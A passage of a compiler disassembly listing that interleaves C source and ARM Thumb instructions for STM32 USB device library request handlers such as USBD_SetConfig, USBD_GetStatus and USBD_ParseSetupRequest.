      (void)USBD_LL_SetUSBAddress(pdev, dev_addr);
 800be70:	7bfb      	ldrb	r3, [r7, #15]
 800be72:	4619      	mov	r1, r3
 800be74:	6878      	ldr	r0, [r7, #4]
 800be76:	f000 ffbf 	bl	800cdf8 <USBD_LL_SetUSBAddress>
      (void)USBD_CtlSendStatus(pdev);
 800be7a:	6878      	ldr	r0, [r7, #4]
 800be7c:	f000 fa7a 	bl	800c374 <USBD_CtlSendStatus>

      if (dev_addr != 0U)
 800be80:	7bfb      	ldrb	r3, [r7, #15]
 800be82:	2b00      	cmp	r3, #0
 800be84:	d004      	beq.n	800be90 <USBD_SetAddress+0x6c>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800be86:	687b      	ldr	r3, [r7, #4]
 800be88:	2202      	movs	r2, #2
 800be8a:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800be8e:	e009      	b.n	800bea4 <USBD_SetAddress+0x80>
      }
      else
      {
        pdev->dev_state = USBD_STATE_DEFAULT;
 800be90:	687b      	ldr	r3, [r7, #4]
 800be92:	2201      	movs	r2, #1
 800be94:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800be98:	e004      	b.n	800bea4 <USBD_SetAddress+0x80>
      }
    }
  }
  else
  {
    USBD_CtlError(pdev, req);
 800be9a:	6839      	ldr	r1, [r7, #0]
 800be9c:	6878      	ldr	r0, [r7, #4]
 800be9e:	f000 f99e 	bl	800c1de <USBD_CtlError>
  }
}
 800bea2:	bf00      	nop
 800bea4:	bf00      	nop
 800bea6:	3710      	adds	r7, #16
 800bea8:	46bd      	mov	sp, r7
 800beaa:	bd80      	pop	{r7, pc}

0800beac <USBD_SetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static USBD_StatusTypeDef USBD_SetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800beac:	b580      	push	{r7, lr}
 800beae:	b084      	sub	sp, #16
 800beb0:	af00      	add	r7, sp, #0
 800beb2:	6078      	str	r0, [r7, #4]
 800beb4:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800beb6:	2300      	movs	r3, #0
 800beb8:	73fb      	strb	r3, [r7, #15]
  static uint8_t cfgidx;

  cfgidx = (uint8_t)(req->wValue);
 800beba:	683b      	ldr	r3, [r7, #0]
 800bebc:	885b      	ldrh	r3, [r3, #2]
 800bebe:	b2da      	uxtb	r2, r3
 800bec0:	4b4e      	ldr	r3, [pc, #312]	; (800bffc <USBD_SetConfig+0x150>)
 800bec2:	701a      	strb	r2, [r3, #0]

  if (cfgidx > USBD_MAX_NUM_CONFIGURATION)
 800bec4:	4b4d      	ldr	r3, [pc, #308]	; (800bffc <USBD_SetConfig+0x150>)
 800bec6:	781b      	ldrb	r3, [r3, #0]
 800bec8:	2b01      	cmp	r3, #1
 800beca:	d905      	bls.n	800bed8 <USBD_SetConfig+0x2c>
  {
    USBD_CtlError(pdev, req);
 800becc:	6839      	ldr	r1, [r7, #0]
 800bece:	6878      	ldr	r0, [r7, #4]
 800bed0:	f000 f985 	bl	800c1de <USBD_CtlError>
    return USBD_FAIL;
 800bed4:	2303      	movs	r3, #3
 800bed6:	e08c      	b.n	800bff2 <USBD_SetConfig+0x146>
  }

  switch (pdev->dev_state)
 800bed8:	687b      	ldr	r3, [r7, #4]
 800beda:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bede:	b2db      	uxtb	r3, r3
 800bee0:	2b02      	cmp	r3, #2
 800bee2:	d002      	beq.n	800beea <USBD_SetConfig+0x3e>
 800bee4:	2b03      	cmp	r3, #3
 800bee6:	d029      	beq.n	800bf3c <USBD_SetConfig+0x90>
 800bee8:	e075      	b.n	800bfd6 <USBD_SetConfig+0x12a>
  {
    case USBD_STATE_ADDRESSED:
      if (cfgidx != 0U)
 800beea:	4b44      	ldr	r3, [pc, #272]	; (800bffc <USBD_SetConfig+0x150>)
 800beec:	781b      	ldrb	r3, [r3, #0]
 800beee:	2b00      	cmp	r3, #0
 800bef0:	d020      	beq.n	800bf34 <USBD_SetConfig+0x88>
      {
        pdev->dev_config = cfgidx;
 800bef2:	4b42      	ldr	r3, [pc, #264]	; (800bffc <USBD_SetConfig+0x150>)
 800bef4:	781b      	ldrb	r3, [r3, #0]
 800bef6:	461a      	mov	r2, r3
 800bef8:	687b      	ldr	r3, [r7, #4]
 800befa:	605a      	str	r2, [r3, #4]

        ret = USBD_SetClassConfig(pdev, cfgidx);
 800befc:	4b3f      	ldr	r3, [pc, #252]	; (800bffc <USBD_SetConfig+0x150>)
 800befe:	781b      	ldrb	r3, [r3, #0]
 800bf00:	4619      	mov	r1, r3
 800bf02:	6878      	ldr	r0, [r7, #4]
 800bf04:	f7ff f848 	bl	800af98 <USBD_SetClassConfig>
 800bf08:	4603      	mov	r3, r0
 800bf0a:	73fb      	strb	r3, [r7, #15]

        if (ret != USBD_OK)
 800bf0c:	7bfb      	ldrb	r3, [r7, #15]
 800bf0e:	2b00      	cmp	r3, #0
 800bf10:	d008      	beq.n	800bf24 <USBD_SetConfig+0x78>
        {
          USBD_CtlError(pdev, req);
 800bf12:	6839      	ldr	r1, [r7, #0]
 800bf14:	6878      	ldr	r0, [r7, #4]
 800bf16:	f000 f962 	bl	800c1de <USBD_CtlError>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800bf1a:	687b      	ldr	r3, [r7, #4]
 800bf1c:	2202      	movs	r2, #2
 800bf1e:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800bf22:	e065      	b.n	800bff0 <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800bf24:	6878      	ldr	r0, [r7, #4]
 800bf26:	f000 fa25 	bl	800c374 <USBD_CtlSendStatus>
          pdev->dev_state = USBD_STATE_CONFIGURED;
 800bf2a:	687b      	ldr	r3, [r7, #4]
 800bf2c:	2203      	movs	r2, #3
 800bf2e:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800bf32:	e05d      	b.n	800bff0 <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800bf34:	6878      	ldr	r0, [r7, #4]
 800bf36:	f000 fa1d 	bl	800c374 <USBD_CtlSendStatus>
      break;
 800bf3a:	e059      	b.n	800bff0 <USBD_SetConfig+0x144>

    case USBD_STATE_CONFIGURED:
      if (cfgidx == 0U)
 800bf3c:	4b2f      	ldr	r3, [pc, #188]	; (800bffc <USBD_SetConfig+0x150>)
 800bf3e:	781b      	ldrb	r3, [r3, #0]
 800bf40:	2b00      	cmp	r3, #0
 800bf42:	d112      	bne.n	800bf6a <USBD_SetConfig+0xbe>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800bf44:	687b      	ldr	r3, [r7, #4]
 800bf46:	2202      	movs	r2, #2
 800bf48:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
        pdev->dev_config = cfgidx;
 800bf4c:	4b2b      	ldr	r3, [pc, #172]	; (800bffc <USBD_SetConfig+0x150>)
 800bf4e:	781b      	ldrb	r3, [r3, #0]
 800bf50:	461a      	mov	r2, r3
 800bf52:	687b      	ldr	r3, [r7, #4]
 800bf54:	605a      	str	r2, [r3, #4]
        (void)USBD_ClrClassConfig(pdev, cfgidx);
 800bf56:	4b29      	ldr	r3, [pc, #164]	; (800bffc <USBD_SetConfig+0x150>)
 800bf58:	781b      	ldrb	r3, [r3, #0]
 800bf5a:	4619      	mov	r1, r3
 800bf5c:	6878      	ldr	r0, [r7, #4]
 800bf5e:	f7ff f837 	bl	800afd0 <USBD_ClrClassConfig>
        (void)USBD_CtlSendStatus(pdev);
 800bf62:	6878      	ldr	r0, [r7, #4]
 800bf64:	f000 fa06 	bl	800c374 <USBD_CtlSendStatus>
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800bf68:	e042      	b.n	800bff0 <USBD_SetConfig+0x144>
      else if (cfgidx != pdev->dev_config)
 800bf6a:	4b24      	ldr	r3, [pc, #144]	; (800bffc <USBD_SetConfig+0x150>)
 800bf6c:	781b      	ldrb	r3, [r3, #0]
 800bf6e:	461a      	mov	r2, r3
 800bf70:	687b      	ldr	r3, [r7, #4]
 800bf72:	685b      	ldr	r3, [r3, #4]
 800bf74:	429a      	cmp	r2, r3
 800bf76:	d02a      	beq.n	800bfce <USBD_SetConfig+0x122>
        (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800bf78:	687b      	ldr	r3, [r7, #4]
 800bf7a:	685b      	ldr	r3, [r3, #4]
 800bf7c:	b2db      	uxtb	r3, r3
 800bf7e:	4619      	mov	r1, r3
 800bf80:	6878      	ldr	r0, [r7, #4]
 800bf82:	f7ff f825 	bl	800afd0 <USBD_ClrClassConfig>
        pdev->dev_config = cfgidx;
 800bf86:	4b1d      	ldr	r3, [pc, #116]	; (800bffc <USBD_SetConfig+0x150>)
 800bf88:	781b      	ldrb	r3, [r3, #0]
 800bf8a:	461a      	mov	r2, r3
 800bf8c:	687b      	ldr	r3, [r7, #4]
 800bf8e:	605a      	str	r2, [r3, #4]
        ret = USBD_SetClassConfig(pdev, cfgidx);
 800bf90:	4b1a      	ldr	r3, [pc, #104]	; (800bffc <USBD_SetConfig+0x150>)
 800bf92:	781b      	ldrb	r3, [r3, #0]
 800bf94:	4619      	mov	r1, r3
 800bf96:	6878      	ldr	r0, [r7, #4]
 800bf98:	f7fe fffe 	bl	800af98 <USBD_SetClassConfig>
 800bf9c:	4603      	mov	r3, r0
 800bf9e:	73fb      	strb	r3, [r7, #15]
        if (ret != USBD_OK)
 800bfa0:	7bfb      	ldrb	r3, [r7, #15]
 800bfa2:	2b00      	cmp	r3, #0
 800bfa4:	d00f      	beq.n	800bfc6 <USBD_SetConfig+0x11a>
          USBD_CtlError(pdev, req);
 800bfa6:	6839      	ldr	r1, [r7, #0]
 800bfa8:	6878      	ldr	r0, [r7, #4]
 800bfaa:	f000 f918 	bl	800c1de <USBD_CtlError>
          (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800bfae:	687b      	ldr	r3, [r7, #4]
 800bfb0:	685b      	ldr	r3, [r3, #4]
 800bfb2:	b2db      	uxtb	r3, r3
 800bfb4:	4619      	mov	r1, r3
 800bfb6:	6878      	ldr	r0, [r7, #4]
 800bfb8:	f7ff f80a 	bl	800afd0 <USBD_ClrClassConfig>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800bfbc:	687b      	ldr	r3, [r7, #4]
 800bfbe:	2202      	movs	r2, #2
 800bfc0:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800bfc4:	e014      	b.n	800bff0 <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800bfc6:	6878      	ldr	r0, [r7, #4]
 800bfc8:	f000 f9d4 	bl	800c374 <USBD_CtlSendStatus>
      break;
 800bfcc:	e010      	b.n	800bff0 <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800bfce:	6878      	ldr	r0, [r7, #4]
 800bfd0:	f000 f9d0 	bl	800c374 <USBD_CtlSendStatus>
      break;
 800bfd4:	e00c      	b.n	800bff0 <USBD_SetConfig+0x144>

    default:
      USBD_CtlError(pdev, req);
 800bfd6:	6839      	ldr	r1, [r7, #0]
 800bfd8:	6878      	ldr	r0, [r7, #4]
 800bfda:	f000 f900 	bl	800c1de <USBD_CtlError>
      (void)USBD_ClrClassConfig(pdev, cfgidx);
 800bfde:	4b07      	ldr	r3, [pc, #28]	; (800bffc <USBD_SetConfig+0x150>)
 800bfe0:	781b      	ldrb	r3, [r3, #0]
 800bfe2:	4619      	mov	r1, r3
 800bfe4:	6878      	ldr	r0, [r7, #4]
 800bfe6:	f7fe fff3 	bl	800afd0 <USBD_ClrClassConfig>
      ret = USBD_FAIL;
 800bfea:	2303      	movs	r3, #3
 800bfec:	73fb      	strb	r3, [r7, #15]
      break;
 800bfee:	bf00      	nop
  }

  return ret;
 800bff0:	7bfb      	ldrb	r3, [r7, #15]
}
 800bff2:	4618      	mov	r0, r3
 800bff4:	3710      	adds	r7, #16
 800bff6:	46bd      	mov	sp, r7
 800bff8:	bd80      	pop	{r7, pc}
 800bffa:	bf00      	nop
 800bffc:	200003bc 	.word	0x200003bc

0800c000 <USBD_GetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c000:	b580      	push	{r7, lr}
 800c002:	b082      	sub	sp, #8
 800c004:	af00      	add	r7, sp, #0
 800c006:	6078      	str	r0, [r7, #4]
 800c008:	6039      	str	r1, [r7, #0]
  if (req->wLength != 1U)
 800c00a:	683b      	ldr	r3, [r7, #0]
 800c00c:	88db      	ldrh	r3, [r3, #6]
 800c00e:	2b01      	cmp	r3, #1
 800c010:	d004      	beq.n	800c01c <USBD_GetConfig+0x1c>
  {
    USBD_CtlError(pdev, req);
 800c012:	6839      	ldr	r1, [r7, #0]
 800c014:	6878      	ldr	r0, [r7, #4]
 800c016:	f000 f8e2 	bl	800c1de <USBD_CtlError>
      default:
        USBD_CtlError(pdev, req);
        break;
    }
  }
}
 800c01a:	e023      	b.n	800c064 <USBD_GetConfig+0x64>
    switch (pdev->dev_state)
 800c01c:	687b      	ldr	r3, [r7, #4]
 800c01e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c022:	b2db      	uxtb	r3, r3
 800c024:	2b02      	cmp	r3, #2
 800c026:	dc02      	bgt.n	800c02e <USBD_GetConfig+0x2e>
 800c028:	2b00      	cmp	r3, #0
 800c02a:	dc03      	bgt.n	800c034 <USBD_GetConfig+0x34>
 800c02c:	e015      	b.n	800c05a <USBD_GetConfig+0x5a>
 800c02e:	2b03      	cmp	r3, #3
 800c030:	d00b      	beq.n	800c04a <USBD_GetConfig+0x4a>
 800c032:	e012      	b.n	800c05a <USBD_GetConfig+0x5a>
        pdev->dev_default_config = 0U;
 800c034:	687b      	ldr	r3, [r7, #4]
 800c036:	2200      	movs	r2, #0
 800c038:	609a      	str	r2, [r3, #8]
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_default_config, 1U);
 800c03a:	687b      	ldr	r3, [r7, #4]
 800c03c:	3308      	adds	r3, #8
 800c03e:	2201      	movs	r2, #1
 800c040:	4619      	mov	r1, r3
 800c042:	6878      	ldr	r0, [r7, #4]
 800c044:	f000 f93c 	bl	800c2c0 <USBD_CtlSendData>
        break;
 800c048:	e00c      	b.n	800c064 <USBD_GetConfig+0x64>
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config, 1U);
 800c04a:	687b      	ldr	r3, [r7, #4]
 800c04c:	3304      	adds	r3, #4
 800c04e:	2201      	movs	r2, #1
 800c050:	4619      	mov	r1, r3
 800c052:	6878      	ldr	r0, [r7, #4]
 800c054:	f000 f934 	bl	800c2c0 <USBD_CtlSendData>
        break;
 800c058:	e004      	b.n	800c064 <USBD_GetConfig+0x64>
        USBD_CtlError(pdev, req);
 800c05a:	6839      	ldr	r1, [r7, #0]
 800c05c:	6878      	ldr	r0, [r7, #4]
 800c05e:	f000 f8be 	bl	800c1de <USBD_CtlError>
        break;
 800c062:	bf00      	nop
}
 800c064:	bf00      	nop
 800c066:	3708      	adds	r7, #8
 800c068:	46bd      	mov	sp, r7
 800c06a:	bd80      	pop	{r7, pc}

0800c06c <USBD_GetStatus>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetStatus(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c06c:	b580      	push	{r7, lr}
 800c06e:	b082      	sub	sp, #8
 800c070:	af00      	add	r7, sp, #0
 800c072:	6078      	str	r0, [r7, #4]
 800c074:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800c076:	687b      	ldr	r3, [r7, #4]
 800c078:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c07c:	b2db      	uxtb	r3, r3
 800c07e:	3b01      	subs	r3, #1
 800c080:	2b02      	cmp	r3, #2
 800c082:	d81e      	bhi.n	800c0c2 <USBD_GetStatus+0x56>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wLength != 0x2U)
 800c084:	683b      	ldr	r3, [r7, #0]
 800c086:	88db      	ldrh	r3, [r3, #6]
 800c088:	2b02      	cmp	r3, #2
 800c08a:	d004      	beq.n	800c096 <USBD_GetStatus+0x2a>
      {
        USBD_CtlError(pdev, req);
 800c08c:	6839      	ldr	r1, [r7, #0]
 800c08e:	6878      	ldr	r0, [r7, #4]
 800c090:	f000 f8a5 	bl	800c1de <USBD_CtlError>
        break;
 800c094:	e01a      	b.n	800c0cc <USBD_GetStatus+0x60>
      }

#if (USBD_SELF_POWERED == 1U)
      pdev->dev_config_status = USB_CONFIG_SELF_POWERED;
 800c096:	687b      	ldr	r3, [r7, #4]
 800c098:	2201      	movs	r2, #1
 800c09a:	60da      	str	r2, [r3, #12]
#else
      pdev->dev_config_status = 0U;
#endif /* USBD_SELF_POWERED */

      if (pdev->dev_remote_wakeup != 0U)
 800c09c:	687b      	ldr	r3, [r7, #4]
 800c09e:	f8d3 32a4 	ldr.w	r3, [r3, #676]	; 0x2a4
 800c0a2:	2b00      	cmp	r3, #0
 800c0a4:	d005      	beq.n	800c0b2 <USBD_GetStatus+0x46>
      {
        pdev->dev_config_status |= USB_CONFIG_REMOTE_WAKEUP;
 800c0a6:	687b      	ldr	r3, [r7, #4]
 800c0a8:	68db      	ldr	r3, [r3, #12]
 800c0aa:	f043 0202 	orr.w	r2, r3, #2
 800c0ae:	687b      	ldr	r3, [r7, #4]
 800c0b0:	60da      	str	r2, [r3, #12]
      }

      (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config_status, 2U);
 800c0b2:	687b      	ldr	r3, [r7, #4]
 800c0b4:	330c      	adds	r3, #12
 800c0b6:	2202      	movs	r2, #2
 800c0b8:	4619      	mov	r1, r3
 800c0ba:	6878      	ldr	r0, [r7, #4]
 800c0bc:	f000 f900 	bl	800c2c0 <USBD_CtlSendData>
      break;
 800c0c0:	e004      	b.n	800c0cc <USBD_GetStatus+0x60>

    default:
      USBD_CtlError(pdev, req);
 800c0c2:	6839      	ldr	r1, [r7, #0]
 800c0c4:	6878      	ldr	r0, [r7, #4]
 800c0c6:	f000 f88a 	bl	800c1de <USBD_CtlError>
      break;
 800c0ca:	bf00      	nop
  }
}
 800c0cc:	bf00      	nop
 800c0ce:	3708      	adds	r7, #8
 800c0d0:	46bd      	mov	sp, r7
 800c0d2:	bd80      	pop	{r7, pc}

0800c0d4 <USBD_SetFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c0d4:	b580      	push	{r7, lr}
 800c0d6:	b082      	sub	sp, #8
 800c0d8:	af00      	add	r7, sp, #0
 800c0da:	6078      	str	r0, [r7, #4]
 800c0dc:	6039      	str	r1, [r7, #0]
  if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c0de:	683b      	ldr	r3, [r7, #0]
 800c0e0:	885b      	ldrh	r3, [r3, #2]
 800c0e2:	2b01      	cmp	r3, #1
 800c0e4:	d107      	bne.n	800c0f6 <USBD_SetFeature+0x22>
  {
    pdev->dev_remote_wakeup = 1U;
 800c0e6:	687b      	ldr	r3, [r7, #4]
 800c0e8:	2201      	movs	r2, #1
 800c0ea:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
    (void)USBD_CtlSendStatus(pdev);
 800c0ee:	6878      	ldr	r0, [r7, #4]
 800c0f0:	f000 f940 	bl	800c374 <USBD_CtlSendStatus>
  }
  else
  {
    USBD_CtlError(pdev, req);
  }
}
 800c0f4:	e013      	b.n	800c11e <USBD_SetFeature+0x4a>
  else if (req->wValue == USB_FEATURE_TEST_MODE)
 800c0f6:	683b      	ldr	r3, [r7, #0]
 800c0f8:	885b      	ldrh	r3, [r3, #2]
 800c0fa:	2b02      	cmp	r3, #2
 800c0fc:	d10b      	bne.n	800c116 <USBD_SetFeature+0x42>
    pdev->dev_test_mode = (uint8_t)(req->wIndex >> 8);
 800c0fe:	683b      	ldr	r3, [r7, #0]
 800c100:	889b      	ldrh	r3, [r3, #4]
 800c102:	0a1b      	lsrs	r3, r3, #8
 800c104:	b29b      	uxth	r3, r3
 800c106:	b2da      	uxtb	r2, r3
 800c108:	687b      	ldr	r3, [r7, #4]
 800c10a:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
    (void)USBD_CtlSendStatus(pdev);
 800c10e:	6878      	ldr	r0, [r7, #4]
 800c110:	f000 f930 	bl	800c374 <USBD_CtlSendStatus>
}
 800c114:	e003      	b.n	800c11e <USBD_SetFeature+0x4a>
    USBD_CtlError(pdev, req);
 800c116:	6839      	ldr	r1, [r7, #0]
 800c118:	6878      	ldr	r0, [r7, #4]
 800c11a:	f000 f860 	bl	800c1de <USBD_CtlError>
}
 800c11e:	bf00      	nop
 800c120:	3708      	adds	r7, #8
 800c122:	46bd      	mov	sp, r7
 800c124:	bd80      	pop	{r7, pc}

0800c126 <USBD_ClrFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_ClrFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c126:	b580      	push	{r7, lr}
 800c128:	b082      	sub	sp, #8
 800c12a:	af00      	add	r7, sp, #0
 800c12c:	6078      	str	r0, [r7, #4]
 800c12e:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800c130:	687b      	ldr	r3, [r7, #4]
 800c132:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c136:	b2db      	uxtb	r3, r3
 800c138:	3b01      	subs	r3, #1
 800c13a:	2b02      	cmp	r3, #2
 800c13c:	d80b      	bhi.n	800c156 <USBD_ClrFeature+0x30>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c13e:	683b      	ldr	r3, [r7, #0]
 800c140:	885b      	ldrh	r3, [r3, #2]
 800c142:	2b01      	cmp	r3, #1
 800c144:	d10c      	bne.n	800c160 <USBD_ClrFeature+0x3a>
      {
        pdev->dev_remote_wakeup = 0U;
 800c146:	687b      	ldr	r3, [r7, #4]
 800c148:	2200      	movs	r2, #0
 800c14a:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
        (void)USBD_CtlSendStatus(pdev);
 800c14e:	6878      	ldr	r0, [r7, #4]
 800c150:	f000 f910 	bl	800c374 <USBD_CtlSendStatus>
      }
      break;
 800c154:	e004      	b.n	800c160 <USBD_ClrFeature+0x3a>

    default:
      USBD_CtlError(pdev, req);
 800c156:	6839      	ldr	r1, [r7, #0]
 800c158:	6878      	ldr	r0, [r7, #4]
 800c15a:	f000 f840 	bl	800c1de <USBD_CtlError>
      break;
 800c15e:	e000      	b.n	800c162 <USBD_ClrFeature+0x3c>
      break;
 800c160:	bf00      	nop
  }
}
 800c162:	bf00      	nop
 800c164:	3708      	adds	r7, #8
 800c166:	46bd      	mov	sp, r7
 800c168:	bd80      	pop	{r7, pc}

0800c16a <USBD_ParseSetupRequest>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_ParseSetupRequest(USBD_SetupReqTypedef *req, uint8_t *pdata)
{
 800c16a:	b580      	push	{r7, lr}
 800c16c:	b084      	sub	sp, #16
 800c16e:	af00      	add	r7, sp, #0
 800c170:	6078      	str	r0, [r7, #4]
 800c172:	6039      	str	r1, [r7, #0]
  uint8_t *pbuff = pdata;
 800c174:	683b      	ldr	r3, [r7, #0]
 800c176:	60fb      	str	r3, [r7, #12]

  req->bmRequest = *(uint8_t *)(pbuff);
 800c178:	68fb      	ldr	r3, [r7, #12]
 800c17a:	781a      	ldrb	r2, [r3, #0]
 800c17c:	687b      	ldr	r3, [r7, #4]
 800c17e:	701a      	strb	r2, [r3, #0]

  pbuff++;
 800c180:	68fb      	ldr	r3, [r7, #12]
 800c182:	3301      	adds	r3, #1
 800c184:	60fb      	str	r3, [r7, #12]
  req->bRequest = *(uint8_t *)(pbuff);
 800c186:	68fb      	ldr	r3, [r7, #12]
 800c188:	781a      	ldrb	r2, [r3, #0]
 800c18a:	687b      	ldr	r3, [r7, #4]
 800c18c:	705a      	strb	r2, [r3, #1]

  pbuff++;
 800c18e:	68fb      	ldr	r3, [r7, #12]
 800c190:	3301      	adds	r3, #1
 800c192:	60fb      	str	r3, [r7, #12]
  req->wValue = SWAPBYTE(pbuff);
 800c194:	68f8      	ldr	r0, [r7, #12]
 800c196:	f7ff fa16 	bl	800b5c6 <SWAPBYTE>
 800c19a:	4603      	mov	r3, r0
 800c19c:	461a      	mov	r2, r3
 800c19e:	687b      	ldr	r3, [r7, #4]
 800c1a0:	805a      	strh	r2, [r3, #2]

  pbuff++;
 800c1a2:	68fb      	ldr	r3, [r7, #12]
 800c1a4:	3301      	adds	r3, #1
 800c1a6:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c1a8:	68fb      	ldr	r3, [r7, #12]
 800c1aa:	3301      	adds	r3, #1
 800c1ac:	60fb      	str	r3, [r7, #12]
  req->wIndex = SWAPBYTE(pbuff);
 800c1ae:	68f8      	ldr	r0, [r7, #12]
 800c1b0:	f7ff fa09 	bl	800b5c6 <SWAPBYTE>
 800c1b4:	4603      	mov	r3, r0
 800c1b6:	461a      	mov	r2, r3
 800c1b8:	687b      	ldr	r3, [r7, #4]
 800c1ba:	809a      	strh	r2, [r3, #4]

  pbuff++;
 800c1bc:	68fb      	ldr	r3, [r7, #12]
 800c1be:	3301      	adds	r3, #1
 800c1c0:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c1c2:	68fb      	ldr	r3, [r7, #12]
 800c1c4:	3301      	adds	r3, #1
 800c1c6:	60fb      	str	r3, [r7, #12]
  req->wLength = SWAPBYTE(pbuff);
 800c1c8:	68f8      	ldr	r0, [r7, #12]
 800c1ca:	f7ff f9fc 	bl	800b5c6 <SWAPBYTE>
 800c1ce:	4603      	mov	r3, r0
 800c1d0:	461a      	mov	r2, r3
 800c1d2:	687b      	ldr	r3, [r7, #4]
 800c1d4:	80da      	strh	r2, [r3, #6]
}
 800c1d6:	bf00      	nop
 800c1d8:	3710      	adds	r7, #16
 800c1da:	46bd      	mov	sp, r7
 800c1dc:	bd80      	pop	{r7, pc}

0800c1de <USBD_CtlError>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_CtlError(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c1de:	b580      	push	{r7, lr}
 800c1e0:	b082      	sub	sp, #8
 800c1e2:	af00      	add	r7, sp, #0
 800c1e4:	6078      	str	r0, [r7, #4]
 800c1e6:	6039      	str	r1, [r7, #0]
  UNUSED(req);

  (void)USBD_LL_StallEP(pdev, 0x80U);
 800c1e8:	2180      	movs	r1, #128	; 0x80
 800c1ea:	6878      	ldr	r0, [r7, #4]
 800c1ec:	f000 fd6a 	bl	800ccc4 <USBD_LL_StallEP>
  (void)USBD_LL_StallEP(pdev, 0U);
 800c1f0:	2100      	movs	r1, #0
 800c1f2:	6878      	ldr	r0, [r7, #4]
 800c1f4:	f000 fd66 	bl	800ccc4 <USBD_LL_StallEP>
}
 800c1f8:	bf00      	nop
 800c1fa:	3708      	adds	r7, #8
 800c1fc:	46bd      	mov	sp, r7
 800c1fe:	bd80      	pop	{r7, pc}

0800c200 <USBD_GetString>:
  * @param  unicode : Formatted string buffer (unicode)
  * @param  len : descriptor length
  * @retval None
  */
void USBD_GetString(uint8_t *desc, uint8_t *unicode, uint16_t *len)
{
 800c200:	b580      	push	{r7, lr}
 800c202:	b086      	sub	sp, #24
 800c204:	af00      	add	r7, sp, #0
 800c206:	60f8      	str	r0, [r7, #12]
 800c208:	60b9      	str	r1, [r7, #8]
 800c20a:	607a      	str	r2, [r7, #4]
  uint8_t idx = 0U;
 800c20c:	2300      	movs	r3, #0
 800c20e:	75fb      	strb	r3, [r7, #23]
  uint8_t *pdesc;

  if (desc == NULL)
 800c210:	68fb      	ldr	r3, [r7, #12]
 800c212:	2b00      	cmp	r3, #0
 800c214:	d036      	beq.n	800c284 <USBD_GetString+0x84>
  {
    return;
  }

  pdesc = desc;
 800c216:	68fb      	ldr	r3, [r7, #12]
 800c218:	613b      	str	r3, [r7, #16]
  *len = ((uint16_t)USBD_GetLen(pdesc) * 2U) + 2U;
 800c21a:	6938      	ldr	r0, [r7, #16]
 800c21c:	f000 f836 	bl	800c28c <USBD_GetLen>
 800c220:	4603      	mov	r3, r0
 800c222:	3301      	adds	r3, #1
 800c224:	b29b      	uxth	r3, r3
 800c226:	005b      	lsls	r3, r3, #1
 800c228:	b29a      	uxth	r2, r3
 800c22a:	687b      	ldr	r3, [r7, #4]
 800c22c:	801a      	strh	r2, [r3, #0]

  unicode[idx] = *(uint8_t *)len;
 800c22e:	7dfb      	ldrb	r3, [r7, #23]
 800c230:	68ba      	ldr	r2, [r7, #8]
 800c232:	4413      	add	r3, r2
 800c234:	687a      	ldr	r2, [r7, #4]
 800c236:	7812      	ldrb	r2, [r2, #0]
 800c238:	701a      	strb	r2, [r3, #0]
  idx++;
